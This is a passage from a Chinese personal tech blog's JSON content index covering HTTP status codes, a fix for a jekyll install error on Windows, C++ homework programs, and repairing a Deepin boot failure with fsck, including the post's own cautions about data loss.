自从上次请求后，请求的网页未被修改过。服务器返回此响应时，不会返回网页内容。如果网页自请求者上次请求后再也没有更改过，您应当将服务器配置为返回此响应(称为 If-Modified-Since HTTP 标头)。由于服务器可以告诉 Googlebot 自从上次抓取后网页没有更改过，因此可节省带宽和开销。305(使用***) 请求者只能使用访问请求的网页。如果服务器返回此响应，那么，服务器还会指明请求者应当使用的。307(临时重定向) 服务器目前正从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。此代码与响应 GET 和 HEAD 请求的 301 代码类似，会自动将请求者转到不同的位置。但由于 Googlebot 会继续抓取原有位置并将其编入索引，因此您不应使用此代码来通知 Googlebot 某个页面或网站已被移动。 4xx(请求错误)这些状态代码表示，请求可能出错，已妨碍了服务器对请求的处理。400(错误请求) 服务器不理解请求的语法。401(未授权) 请求要求进行身份验证。登录后，服务器可能会返回对页面的此响应。403(已禁止) 服务器拒绝请求。如果在 Googlebot 尝试抓取您网站上的有效网页时显示此状态代码(您可在 Google 网站管理员工具中诊断下的网络抓取页面上看到此状态代码)，那么，这可能是您的服务器或主机拒绝 Googlebot 对其进行访问。404(未找到) 服务器找不到请求的网页。例如，如果请求是针对服务器上不存在的网页进行的，那么，服务器通常会返回此代码。如果您的网站上没有 robots.txt 文件，而您在 Google 网站管理员工具”诊断”标签的 robots.txt 页上发现此状态，那么，这是正确的状态。然而，如果您有 robots.txt 文件而又发现了此状态，那么，这说明您的 robots.txt 文件可能是命名错误或位于错误的位置。(该文件应当位于顶级域名上，且应当名为 robots.txt)。如果您在 Googlebot 尝试抓取的网址上发现此状态(位于”诊断”标签的 HTTP 错误页上)，那么，这表示 Googlebot 所追踪的可能是另一网页中的无效链接(旧链接或输入有误的链接)。405(方法禁用) 禁用请求中所指定的方法。406(不接受) 无法使用请求的内容特性来响应请求的网页。407(需要授权) 此状态代码与 401(未授权)类似，但却指定了请求者应当使用进行授权。如果服务器返回此响应，那么，服务器还会指明请求者应当使用的***。408(请求超时) 服务器等候请求时超时。409(冲突) 服务器在完成请求时发生冲突。服务器必须包含有关响应中所发生的冲突的信息。服务器在响应与前一个请求相冲突的 PUT 请求时可能会返回此代码，同时会提供两个请求的差异列表。410(已删除) 如果请求的资源已被永久删除，那么，服务器会返回此响应。该代码与 404(未找到)代码类似，但在资源以前有但现在已经不复存在的情况下，有时会替代 404 代码出现。如果资源已被永久删除，那么，您应当使用 301 代码指定该资源的新位置。411(需要有效长度) 服务器不会接受包含无效内容长度标头字段的请求。412(未满足前提条件) 服务器未满足请求者在请求中设置的其中一个前提条件。413(请求实体过大) 服务器无法处理请求，因为请求实体过大，已超出服务器的处理能力。414(请求的 URI 过长) 请求的 URI(通常为网址)过长，服务器无法进行处理。415(不支持的媒体类型) 请求的格式不受请求页面的支持。416(请求范围不符合要求) 如果请求是针对网页的无效范围进行的，那么，服务器会返回此状态代码。417(未满足期望值) 服务器未满足”期望”请求标头字段的要求。 5xx(服务器错误)这些状态代码表示，服务器在尝试处理请求时发生内部错误。这些错误可能是服务器本身的错误，而不是请求出错。 500(服务器内部错误) 服务器遇到错误，无法完成请求。501(尚未实施) 服务器不具备完成请求的功能。例如，当服务器无法识别请求方法时，服务器可能会返回此代码。502(错误网关) 服务器作为网关或***，从上游服务器收到了无效的响应。503(服务不可用) 目前无法使用服务器(由于超载或进行停机维护)。通常，这只是一种暂时的状态。504(网关超时) 服务器作为网关或代理，未及时从上游服务器接收请求。505(HTTP 版本不受支持) 服务器不支持请求中所使用的 HTTP 协议版本。","categories":[],"tags":[{"name":"计算机网络","slug":"计算机网络","permalink":"https://czqu.net/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}]},{"title":"Windows下用gem install jekyll命令安装jekyll错误","slug":"draft/Failed-to-build-gem-native-extension","date":"2018-01-13T07:52:44.000Z","updated":"2018-01-13T07:52:44.000Z","comments":true,"path":"posts/1223/","permalink":"https://czqu.net/posts/1223/","excerpt":"","text":"Windows下用gem install jekyll命令安装jekyll错误的解决方案 ERROR: Failed to build gem native extension 错误如下：ruby版本也正常，安装的也是with devkit的版本 123456789101112131415Temporarily enhancing PATH for MSYS/MINGW... Building native extensions. This could take a while... ERROR: Error installing jekyll: ERROR: Failed to build gem native extension. current directory: C:/Ruby26-x64/lib/ruby/gems/2.6.0/gems/http_parser.rb-0.6.0/ext/ruby_http_parser C:/Ruby26-x64/bin/ruby.exe -I C:/Ruby26-x64/lib/ruby/2.6.0 -r ./siteconf20200725-11868-qpbmqf.rb extconf.rb creating Makefile current directory: C:/Ruby26-x64/lib/ruby/gems/2.6.0/gems/http_parser.rb-0.6.0/ext/ruby_http_parser make \"DESTDIR=\" clean current directory: C:/Ruby26-x64/lib/ruby/gems/2.6.0/gems/http_parser.rb-0.6.0/ext/ruby_http_parser make \"DESTDIR=\" make failedNo such file or directory - make \"DESTDIR=\" Gem files will remain installed in C:/Ruby26-x64/lib/ruby/gems/2.6.0/gems/http_parser.rb-0.6.0 for inspection. Results logged to C:/Ruby26-x64/lib/ruby/gems/2.6.0/extensions/x64-mingw32/2.6.0/http_parser.rb-0.6.0/gem_make.out 解决方法输入ridk install，安装MSYS2 and MINGW development toolchain","categories":[],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://czqu.net/tags/Windows/"}]},{"title":"c++作业","slug":"draft/cpp-homework","date":"2017-11-01T01:45:16.000Z","updated":"2017-11-01T01:45:16.000Z","comments":true,"path":"posts/43139/","permalink":"https://czqu.net/posts/43139/","excerpt":"","text":"输入输出流与文件操作123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134#include&lt;iostream&gt;#include&lt;fstream&gt;#include&lt;cstdlib&gt;#include&lt;string&gt;using namespace std;//职工struct Person{&nbsp; &nbsp; int m_Id;&nbsp; &nbsp; string m_Name;&nbsp; &nbsp; int m_Age;&nbsp; &nbsp; int m_Wage;&nbsp; &nbsp; Person(int i, string n, int a, int w): m_Id(i), m_Name(n), m_Age(a), m_Wage(w) { }&nbsp; &nbsp; void PrintInfo()&nbsp; &nbsp; {&nbsp; &nbsp; &nbsp; &nbsp; cout &lt;&lt; \"===================\" &lt;&lt; endl;&nbsp; &nbsp; &nbsp; &nbsp; cout &lt;&lt; \"号码:\\t\" &lt;&lt; this -&gt; m_Id &lt;&lt; endl;&nbsp; &nbsp; &nbsp; &nbsp; cout &lt;&lt; \"名字:\\t\" &lt;&lt; this -&gt; m_Name &lt;&lt; endl;&nbsp; &nbsp; &nbsp; &nbsp; cout &lt;&lt; \"年龄:\\t\" &lt;&lt; this -&gt; m_Age &lt;&lt; endl;&nbsp; &nbsp; &nbsp; &nbsp; cout &lt;&lt; \"工资:\\t\" &lt;&lt; this -&gt; m_Wage &lt;&lt; endl;&nbsp; &nbsp; &nbsp; &nbsp; cout &lt;&lt; \"===================\" &lt;&lt; endl;&nbsp; &nbsp; }};Person *p[3] ={&nbsp; &nbsp; new Person(101, \"小黄\", 23, 3100),&nbsp; &nbsp; new Person(102, \"中黄\", 41, 6600),&nbsp; &nbsp; new Person(105, \"大黄\", 55, 7000),};int main(){&nbsp; &nbsp; //对5组数据按ID进行排序&nbsp; &nbsp; int i, j;&nbsp; &nbsp; Person *temp;&nbsp; &nbsp; for(i = 0; i &lt; 3; i++)&nbsp; &nbsp; {&nbsp; &nbsp; &nbsp; &nbsp; for(j = i + 1; j &lt; 3; j++)&nbsp; &nbsp; &nbsp; &nbsp; {&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if(p[i] -&gt; m_Id &gt; p[j] -&gt; m_Id)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; temp = p[i];&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; p[i] = p[j];&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; p[j] = temp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }&nbsp; &nbsp; &nbsp; &nbsp; }&nbsp; &nbsp; }&nbsp; &nbsp; //将排好序的数据存入到文件f.dat&nbsp; &nbsp; ofstream outfile1(\"f.dat\", ios :: out);&nbsp; &nbsp; if(!outfile1)&nbsp; &nbsp; {&nbsp; &nbsp; &nbsp; &nbsp; cerr &lt;&lt; \"f.dat 打开错误\" &lt;&lt; endl;&nbsp; &nbsp; &nbsp; &nbsp; exit(1);&nbsp; &nbsp; }&nbsp; &nbsp; for(i = 0; i &lt; 3; i++)&nbsp; &nbsp; {&nbsp; &nbsp; &nbsp; &nbsp; outfile1 &lt;&lt; p[i] -&gt; m_Id &lt;&lt; \" \"&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&lt;&lt; p[i] -&gt; m_Name &lt;&lt; \" \"&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&lt;&lt; p[i] -&gt; m_Age &lt;&lt; \" \"&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&lt;&lt; p[i] -&gt; m_Wage &lt;&lt; endl;&nbsp; &nbsp; }&nbsp; &nbsp; outfile1.close();&nbsp; &nbsp; //再写入两个职工信息&nbsp; &nbsp; //示例输入 108 Titus 40 4000 109 Tulius 35 5000&nbsp; &nbsp; cout &lt;&lt; \"请输入2个职工信息：\";&nbsp; &nbsp; ofstream outfile2(\"f.dat\", ios :: out | ios :: app);&nbsp; &nbsp; if(!outfile2)&nbsp; &nbsp; {&nbsp; &nbsp; &nbsp; &nbsp; cerr &lt;&lt; \"f.dat 打开错误\" &lt;&lt; endl;&nbsp; &nbsp; &nbsp; &nbsp; exit(1);&nbsp; &nbsp; }&nbsp; &nbsp; temp = new Person(0, \"\", 0, 0);&nbsp; &nbsp; cin &gt;&gt; temp -&gt; m_Id &gt;&gt; temp -&gt; m_Name &gt;&gt; temp -&gt; m_Age &gt;&gt; temp -&gt; m_Wage;&nbsp; &nbsp; outfile2 &lt;&lt; temp -&gt; m_Id &lt;&lt; \" \"&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&lt;&lt; temp -&gt; m_Name &lt;&lt; \" \"&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&lt;&lt; temp -&gt; m_Age &lt;&lt; \" \"&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&lt;&lt; temp -&gt; m_Wage &lt;&lt; endl;&nbsp; &nbsp; cin &gt;&gt; temp -&gt; m_Id &gt;&gt; temp -&gt; m_Name &gt;&gt; temp -&gt; m_Age &gt;&gt; temp -&gt; m_Wage;&nbsp; &nbsp; outfile2 &lt;&lt; temp -&gt; m_Id &lt;&lt; \" \"&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&lt;&lt; temp -&gt; m_Name &lt;&lt; \" \"&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&lt;&lt; temp -&gt; m_Age &lt;&lt; \" \"&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&lt;&lt; temp -&gt; m_Wage &lt;&lt; endl;&nbsp; &nbsp; outfile2.close();&nbsp; &nbsp; //输出文件中的全部职工数据&nbsp; &nbsp; ifstream infile1(\"f.dat\", ios :: in);&nbsp; &nbsp; if(!infile1)&nbsp; &nbsp; {&nbsp; &nbsp; &nbsp; &nbsp; cerr &lt;&lt; \"f.dat 打开错误\" &lt;&lt; endl;&nbsp; &nbsp; &nbsp; &nbsp; exit(1);&nbsp; &nbsp; }&nbsp; &nbsp; for(i = 0; i &lt; 5; i++)&nbsp; &nbsp; {&nbsp; &nbsp; &nbsp; &nbsp; infile1 &gt;&gt; temp -&gt; m_Id &gt;&gt; temp -&gt; m_Name &gt;&gt; temp -&gt; m_Age &gt;&gt; temp -&gt; m_Wage;&nbsp; &nbsp; &nbsp; &nbsp; temp -&gt; PrintInfo();&nbsp; &nbsp; }&nbsp; &nbsp; infile1.close();&nbsp; &nbsp; //输入一个ID检测是否存在&nbsp; &nbsp; int id;&nbsp; &nbsp; cout &lt;&lt; \"请输入一个号码：\";&nbsp; &nbsp; cin &gt;&gt; id;&nbsp; &nbsp; bool isFound = false;&nbsp; &nbsp; ifstream infile2(\"f.dat\", ios :: in);&nbsp; &nbsp; if(!infile2)&nbsp; &nbsp; {&nbsp; &nbsp; &nbsp; &nbsp; cerr &lt;&lt; \"f.dat 打开错误\" &lt;&lt; endl;&nbsp; &nbsp; &nbsp; &nbsp; exit(1);&nbsp; &nbsp; }&nbsp; &nbsp; for(i = 0; i &lt; 5; i++)&nbsp; &nbsp; {&nbsp; &nbsp; &nbsp; &nbsp; infile2 &gt;&gt; temp -&gt; m_Id &gt;&gt; temp -&gt; m_Name &gt;&gt; temp -&gt; m_Age &gt;&gt; temp -&gt; m_Wage;&nbsp; &nbsp; &nbsp; &nbsp; if(temp -&gt; m_Id == id)&nbsp; &nbsp; &nbsp; &nbsp; {&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; temp -&gt; PrintInfo();&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; isFound = true;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; break;&nbsp; &nbsp; &nbsp; &nbsp; }&nbsp; &nbsp; }&nbsp; &nbsp; if(!isFound)&nbsp; &nbsp; {&nbsp; &nbsp; &nbsp; &nbsp; cerr &lt;&lt; \"没有找到这个人\" &lt;&lt; endl;&nbsp; &nbsp; }&nbsp; &nbsp; infile2.close();&nbsp; &nbsp; return 0;} 类和对象的进阶 定义一个复数类，重载运算符“+”、“-”、“”、“/”，使这四个运算符能应用于复数的加减乘除运算。 复数加法：m=a+bi ,n=c+di; m+n=(a+c)+(b+d)i; 复数减法：m=a+bi ,n=c+di; m-n=(a-c)+(b-d)i; 复数乘法：m=a+bi ,n=c+di; mn=(ac-bd)+(bc+ad)i;复数除法：m=a+bi ,n=c+di; m/n=((ac+bd)+(bc-ad)i)/(c2+d2)。 参考教材例题11.1,11.2,11.3,11.5，分别采用公有继承，私有继承和保护继承的方式，在程序运行中，输入num，name,sex,age,addr的值，程序应输出以上五个数据的数值； 3.将教材例9.13中的Time类声明为Date的友元类，输出年月日和时分秒。 第一题123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#include &lt;iostream&gt;#include&lt;cstdio&gt;using namespace std;class Complex{public:&nbsp; &nbsp; Complex(double x = 0, double y = 0) :real(x), imag(y) {}&nbsp; &nbsp; friend Complex operator * (Complex &amp;m, Complex &amp;n);&nbsp; &nbsp; friend Complex operator / (Complex &amp;m, Complex &amp;n);&nbsp; &nbsp; Complex operator + (Complex &amp;n);&nbsp; &nbsp; Complex operator - (Complex &amp;n);&nbsp; &nbsp; void display();private:&nbsp; &nbsp; double real;&nbsp; &nbsp; double imag;};Complex operator * (Complex &amp;m, Complex &amp;n){&nbsp; &nbsp; return Complex(m.real*n.real - m.imag*n.imag, m.real*n.imag + m.imag*n.real);}Complex operator / (Complex &amp;m, Complex &amp;n){&nbsp; &nbsp; Complex c;&nbsp; &nbsp; c.real = (m.real*n.real + m.imag*n.imag) / (n.real*n.real + n.imag*n.imag);&nbsp; &nbsp; c.imag = (m.imag*n.real - m.real*n.imag) / (n.real*n.real + n.imag*n.imag);&nbsp; &nbsp; return c;}Complex &nbsp;Complex ::operator + (Complex &amp;n){&nbsp; &nbsp; return Complex(real + n.real, imag + n.imag);}Complex &nbsp;Complex ::operator - (Complex &amp;n){&nbsp; &nbsp; return Complex(real - n.real, imag - n.imag);}void Complex::display(){&nbsp; &nbsp; cout &lt;&lt; \"&lt;\" &lt;&lt; real &lt;&lt; \",\" &lt;&lt; imag &lt;&lt; \"i&gt;\" &lt;&lt; endl;}int main(){&nbsp; &nbsp; int a,bi,c,di;&nbsp; &nbsp; cout&lt;&lt;\"请输入m的实部和虚部\"&lt;&lt;endl;&nbsp; &nbsp; cin&gt;&gt;a&gt;&gt;bi;&nbsp; &nbsp; cout&lt;&lt;\"请输入n的实部和虚部\"&lt;&lt;endl;&nbsp; &nbsp; cin&gt;&gt;c&gt;&gt;di;&nbsp; &nbsp; Complex m(a, bi), n(c, di), c3;&nbsp; &nbsp; cout&lt;&lt;\"为\"&lt;&lt;endl;&nbsp; &nbsp; m.display();&nbsp; &nbsp; cout&lt;&lt;\"n为\"&lt;&lt;endl;&nbsp; &nbsp; n.display();&nbsp; &nbsp; cout&lt;&lt;\"计算结果为\"&lt;&lt;endl;&nbsp; &nbsp; c3 = m + n;&nbsp; &nbsp; c3.display();&nbsp; &nbsp; c3 = m - n;&nbsp; &nbsp; c3.display();&nbsp; &nbsp; c3 = m * n;&nbsp; &nbsp; c3.display();&nbsp; &nbsp; c3 = m / n;&nbsp; &nbsp; c3.display();&nbsp; &nbsp; return 0;} 第二题123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687#include &lt;iostream&gt;using namespace std;class Student{public:&nbsp; &nbsp; void get_value()&nbsp; &nbsp; {&nbsp; &nbsp; &nbsp; &nbsp; cin&gt;&gt;num&gt;&gt;name&gt;&gt;sex;&nbsp; &nbsp; }&nbsp; &nbsp; void display( )&nbsp; &nbsp; {&nbsp; &nbsp; &nbsp; &nbsp; cout&lt;&lt;\"num: \"&lt;&lt;num&lt;&lt;endl;&nbsp; &nbsp; &nbsp; &nbsp; cout&lt;&lt;\"name: \"&lt;&lt;name&lt;&lt;endl;&nbsp; &nbsp; &nbsp; &nbsp; cout&lt;&lt;\"sex: \"&lt;&lt;sex&lt;&lt;endl;&nbsp; &nbsp; }private :&nbsp; &nbsp; int num;&nbsp; &nbsp; string name;&nbsp; &nbsp; char sex;};class Student1:public Student{public:&nbsp; &nbsp; void get_value1()&nbsp; &nbsp; {&nbsp; &nbsp; &nbsp; &nbsp; get_value();&nbsp; &nbsp; &nbsp; &nbsp; cin&gt;&gt;age&gt;&gt;addr;&nbsp; &nbsp; }&nbsp; &nbsp; void display1()&nbsp; &nbsp; {&nbsp; &nbsp; &nbsp; &nbsp; display();&nbsp; &nbsp; &nbsp; &nbsp; cout&lt;&lt;\"age: \"&lt;&lt;age&lt;&lt;endl;&nbsp; &nbsp; &nbsp; &nbsp; cout&lt;&lt;\"address: \"&lt;&lt;addr&lt;&lt;endl;&nbsp; &nbsp; }private:&nbsp; &nbsp; int age;&nbsp; &nbsp; string addr;};class Student2:private Student{public:&nbsp; &nbsp; void get_value1()&nbsp; &nbsp; {&nbsp; &nbsp; &nbsp; &nbsp; get_value();&nbsp; &nbsp; &nbsp; &nbsp; cin&gt;&gt;age&gt;&gt;addr;&nbsp; &nbsp; }&nbsp; &nbsp; void display1()&nbsp; &nbsp; {&nbsp; &nbsp; &nbsp; &nbsp; display();&nbsp; &nbsp; &nbsp; &nbsp; cout&lt;&lt;\"age: \"&lt;&lt;age&lt;&lt;endl;&nbsp; &nbsp; &nbsp; &nbsp; cout&lt;&lt;\"address: \"&lt;&lt;addr&lt;&lt;endl;&nbsp; &nbsp; }private:&nbsp; &nbsp; int age;&nbsp; &nbsp; string addr;};class Student3:protected Student{public:&nbsp; &nbsp; void get_value1()&nbsp; &nbsp; {&nbsp; &nbsp; &nbsp; &nbsp; get_value();&nbsp; &nbsp; &nbsp; &nbsp; cin&gt;&gt;age&gt;&gt;addr;&nbsp; &nbsp; }&nbsp; &nbsp; void display1()&nbsp; &nbsp; {&nbsp; &nbsp; &nbsp; &nbsp; display();&nbsp; &nbsp; &nbsp; &nbsp; cout&lt;&lt;\"age: \"&lt;&lt;age&lt;&lt;endl;&nbsp; &nbsp; &nbsp; &nbsp; cout&lt;&lt;\"address: \"&lt;&lt;addr&lt;&lt;endl;&nbsp; &nbsp; }private:&nbsp; &nbsp; int age;&nbsp; &nbsp; string addr;};int main(){&nbsp; &nbsp; Student1 stud1;&nbsp; &nbsp; stud1.get_value1();&nbsp; &nbsp; stud1.display1();&nbsp; &nbsp; Student2 stud2;&nbsp; &nbsp; stud2.get_value1();&nbsp; &nbsp; stud2.display1();&nbsp; &nbsp; Student3 stud3;&nbsp; &nbsp; stud3.get_value1();&nbsp; &nbsp; stud3.display1();&nbsp; &nbsp; return 0;} 第三题123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;using namespace std;class Date;class Time{public:&nbsp; &nbsp; Time(int h, int m, int s): hour(h), minute(m), sec(s) {};&nbsp; &nbsp; void display(Date &amp;);private:&nbsp; &nbsp; int hour;&nbsp; &nbsp; int minute;&nbsp; &nbsp; int sec;};class Date{public:&nbsp; &nbsp; friend Time;&nbsp; &nbsp; Date(int m, int d, int y): month(m), day(d), year(y) {};private:&nbsp; &nbsp; int month;&nbsp; &nbsp; int day;&nbsp; &nbsp; int year;};void Time::display(Date &amp;d){&nbsp; &nbsp; cout&lt;&lt;d.month&lt;&lt;\"/\"&lt;&lt;d.day&lt;&lt;\"/\"&lt;&lt;d.year&lt;&lt;endl;&nbsp; &nbsp; cout&lt;&lt;hour&lt;&lt;\":\"&lt;&lt;minute&lt;&lt;\":\"&lt;&lt;sec&lt;&lt;endl;}int main(){&nbsp; &nbsp; Date d1(01, 01, 2019);&nbsp; &nbsp; Time t1(15, 57, 56);&nbsp; &nbsp; t1.display(d1);&nbsp; &nbsp; return 0;}","categories":[],"tags":[{"name":"cpp","slug":"cpp","permalink":"https://czqu.net/tags/cpp/"}]},{"title":"Deepin开机遇见的 [Firmware Bug] initramfs问题","slug":"draft/Deepip-initramfs-problem","date":"2017-05-15T03:31:22.000Z","updated":"2017-05-15T03:31:22.000Z","comments":true,"path":"posts/44884/","permalink":"https://czqu.net/posts/44884/","excerpt":"","text":"[Firmware Bug]： TSC_DEADLINE disabled due to Errata; please update microcode to version: 0x25 (or later) 解决方法：首先输入exit 然后输入 1fsck -y /dev/sd ** 这里依据出现的提示输入，例如 1fsck -y /dev/sda 然后再输入exit进入系统 顺便可以更新一下 输入： 1sudo apt-get install intel-microcode 或者： 1sudo apt-get install amd64-ucode 功能说明：检查文件系统并尝试修复错误。 语 法：fsck [-aANPrRsTV][-t &lt;文件系统类型&gt;][文件系统…] 补充说明：当文件系统发生错误四化，可用fsck指令尝试加以修复。 注意：千万不能在运行的系统上面直接执行fsck，特别是RHEL6.0以下ext3的文件系统，否则100%损坏根文件系统，使用fsck -y /dev/sdb1 修复磁盘时，必须将sdb1分区umount掉 参 数： -a 自动修复文件系统，不询问任何问题。 -A 依照/etc/fstab配置文件的内容，检查文件内所列的全部文件系统。 -N 不执行指令，仅列出实际执行会进行的动作。 -P 当搭配”-A”参数使用时，则会同时检查所有的文件系统。 -r 采用互动模式，在执行修复时询问问题，让用户得以确认并决定处理方式。 -R 当搭配”-A”参数使用时，则会略过/目录的文件系统不予检查。 -s 依序执行检查作业，而非同时执行。 -t&lt;文件系统类型&gt; 指定要检查的文件系统类型。 -T 执行fsck指令时，不显示标题信息。 -V 显示指令执行过程。 fdisk -l 查看设备号 运行 fsck -y /dev/sdb1 修复磁盘 -y参数为自动确认修复 这条命令也是用fsck修复磁盘是，常使用的命令 特别说明：在EXT3（实际上其他文件系统也类似）无法mount，或者提示fsck时，如果有重要数据，应该慎重对待，千万不可贸然执行”fsck -f -y “这样的自动修复功能。如果可能，先对故障区域做dd全镜像后再执行，或者以只读方式执行，并仔细看修复过程，如果提示大量inode错误、需要重建树、或大小不对等就不可再继续下去了。 Linux ext3 fsck一定要慎用不管是哪种文件系统，其根本目的都是相同的：如何把文件存在系统给定的区域里，如何有效地管理文件的读与写。为实现这样的目的，驱动层需要完善、周密地应付附加在文件系统上的各种操作。这些操作通常不会是一条指令完成的，如果一个过程需要多条指令完成，在执行这些操作时，全部指令未完成的情况下产生中断，那这个文件系统便会出现一致性错误(或者叫连续性错误)。 为了保证尽可以少的出现一致性错误，现在主流的文件系统都会设计成日志型的。日志型文件系统的主要特点就是把一个操作的所有指令执行过程都另外缓冲下来，如果全部执行完成再清除日志标志，如果操作没有执行完成，可以在重新激活后通过日志回溯或继续完成。 EXT3的日志功能通过在EXT2的设计基础上增加一个特殊的文件(通常是８号节点文件)，在这个文件中记录文件系统的操作过程。但EXT系统文件系统本身在节点、间接索引块、目录节点方面没有冗余保护，所以当文件系统除日志外的其他结构并不一致，却又要通过fsck来进行修复，这种一致性有可能将原本正确的结构也错误化。(就像原来是1+2=3，现在错成了1+3=3，也许改完后变成了1+3=4，就完全没办法还原成最早的1+2=3)。 数据恢复领域经常会遇到这类情况：一次RAID出故障后，下次启动系统提示做fsck，但做完后，也无法mount分区或者mount 分区后数据全是错的。需要对这类情况进行数据修复的难度是很大的，从一个完整的结构(fsck后实际上从系统角度看已经是完整的了)再构建另一个完全不同的结构要比修正一个错误的结构更难以下手。其实这类情况，很多是因为RAID5有早离线的盘加入了两个逻辑磁盘组，导致所有的数据流是以新+旧的方式交错组成的，自然会有太多错误。这时候如果做fsck后，有可能数据都无法恢复了。 所以，在EXT3（实际上其他文件系统也类似）无法mount，或者提示fsck时，如果有重要数据，应该慎重对待，千万不可贸然执行”fsck -f -y “这样的自动修复功能。如果可能，先对故障区域做dd全镜像后再执行，或者以只读方式执行，并仔细看修复过程，如果提示大量inode错误、需要重建树、或大小不对等就不可再继续下去了。","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://czqu.net/tags/Linux/"}]}],"categories":[{"name":"远程解锁","slug":"远程解锁","permalink":"https://czqu.net/categories/%E8%BF%9C%E7%A8%8B%E8%A7%A3%E9%94%81/"}],"tags":[{"name":"远程解锁","slug":"远程解锁","permalink":"https://czqu.net/tags/%E8%BF%9C%E7%A8%8B%E8%A7%A3%E9%94%81/"},{"name":"mac","slug":"mac","permalink":"https://czqu.net/tags/mac/"},{"name":"docker","slug":"docker","permalink":"https://czqu.net/tags/docker/"},{"name":"运维","slug":"运维","permalink":"https://czqu.net/tags/%E8%BF%90%E7%BB%B4/"},{"name":"esp8266","slug":"esp8266","permalink":"https://czqu.net/tags/esp8266/"},{"name":"后端","slug":"后端","permalink":"https://czqu.net/tags/%E5%90%8E%E7%AB%AF/"},{"name":"踩坑","slug":"踩坑","permalink":"https://czqu.net/tags/%E8%B8%A9%E5%9D%91/"},{"name":"ffmpeg","slug":"ffmpeg","permalink":"https://czqu.net/tags/ffmpeg/"},{"name":"git","slug":"git","permalink":"https://czqu.net/tags/git/"},{"name":"hexo","slug":"hexo","permalink":"https://czqu.net/tags/hexo/"},{"name":"Windows","slug":"Windows","permalink":"https://czqu.net/tags/Windows/"},{"name":"springboot","slug":"springboot","permalink":"https://czqu.net/tags/springboot/"},{"name":"java","slug":"java","permalink":"https://czqu.net/tags/java/"},{"name":"spring","slug":"spring","permalink":"https://czqu.net/tags/spring/"},{"name":"前端","slug":"前端","permalink":"https://czqu.net/tags/%E5%89%8D%E7%AB%AF/"},{"name":"Linux","slug":"Linux","permalink":"https://czqu.net/tags/Linux/"},{"name":"刷机","slug":"刷机","permalink":"https://czqu.net/tags/%E5%88%B7%E6%9C%BA/"},{"name":"cpp","slug":"cpp","permalink":"https://czqu.net/tags/cpp/"},{"name":"算法","slug":"算法","permalink":"https://czqu.net/tags/%E7%AE%97%E6%B3%95/"},{"name":"数学","slug":"数学","permalink":"https://czqu.net/tags/%E6%95%B0%E5%AD%A6/"},{"name":"C语言","slug":"C语言","permalink":"https://czqu.net/tags/C%E8%AF%AD%E8%A8%80/"},{"name":"答案","slug":"答案","permalink":"https://czqu.net/tags/%E7%AD%94%E6%A1%88/"},{"name":"安卓","slug":"安卓","permalink":"https://czqu.net/tags/%E5%AE%89%E5%8D%93/"},{"name":"二分法","slug":"二分法","permalink":"https://czqu.net/tags/%E4%BA%8C%E5%88%86%E6%B3%95/"},{"name":"动态规划","slug":"动态规划","permalink":"https://czqu.net/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"},{"name":"数据结构","slug":"数据结构","permalink":"https://czqu.net/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"栈","slug":"栈","permalink":"https://czqu.net/tags/%E6%A0%88/"},{"name":"队列","slug":"队列","permalink":"https://czqu.net/tags/%E9%98%9F%E5%88%97/"},{"name":"二进制","slug":"二进制","permalink":"https://czqu.net/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"},{"name":"基础","slug":"基础","permalink":"https://czqu.net/tags/%E5%9F%BA%E7%A1%80/"},{"name":"jvm","slug":"jvm","permalink":"https://czqu.net/tags/jvm/"},{"name":"泛型","slug":"泛型","permalink":"https://czqu.net/tags/%E6%B3%9B%E5%9E%8B/"},{"name":"二叉树","slug":"二叉树","permalink":"https://czqu.net/tags/%E4%BA%8C%E5%8F%89%E6%A0%91/"},{"name":"idea","slug":"idea","permalink":"https://czqu.net/tags/idea/"},{"name":"测试","slug":"测试","permalink":"https://czqu.net/tags/%E6%B5%8B%E8%AF%95/"},{"name":"链表","slug":"链表","permalink":"https://czqu.net/tags/%E9%93%BE%E8%A1%A8/"},{"name":"信息安全","slug":"信息安全","permalink":"https://czqu.net/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"},{"name":"单片机","slug":"单片机","permalink":"https://czqu.net/tags/%E5%8D%95%E7%89%87%E6%9C%BA/"},{"name":"vscode","slug":"vscode","permalink":"https://czqu.net/tags/vscode/"},{"name":"kali","slug":"kali","permalink":"https://czqu.net/ta